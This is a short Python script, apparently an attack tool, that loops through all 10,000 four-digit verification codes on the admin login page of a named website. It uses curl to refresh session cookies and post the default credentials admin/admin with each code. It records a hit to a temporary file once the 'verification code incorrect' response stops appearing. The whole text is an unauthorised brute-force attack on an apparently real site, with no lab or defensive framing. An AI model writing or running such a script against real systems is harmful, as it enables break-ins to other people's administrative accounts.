import subprocess, time
U = 'http://yurundianqi.com'
C = '/tmp/yb_fast.txt'
for i in range(10000):
    c = f"{i:04d}"
    try:
        if i % 20 == 0:
            subprocess.run(['curl','-sk','--connect-timeout','3','-c',C,'-b',C,'-o','/dev/null',U+'/admin.php'],timeout=5)
            subprocess.run(['curl','-sk','--connect-timeout','3',U+'/admin.php?s=/Login/verify/id/a_login_1','-b',C,'-o','/dev/null'],timeout=5)
        r = subprocess.run(['curl','-sk','-L','--connect-timeout','3','--max-time','5',U+'/admin.php?s=/Login/login','-X','POST','-d',f'username=admin&password=admin&code={c}','-b',C],capture_output=True,text=True,timeout=6)
        if '验证码不正确' not in r.stdout and len(r.stdout) > 10:
            open('/tmp/YB_HIT.txt','a').write(f"HIT: code={c} len={len(r.stdout)} resp={r.stdout[:200]}\n")
            break
    except: pass
    if i % 1000 == 0: print(f"[{i}/10000]")
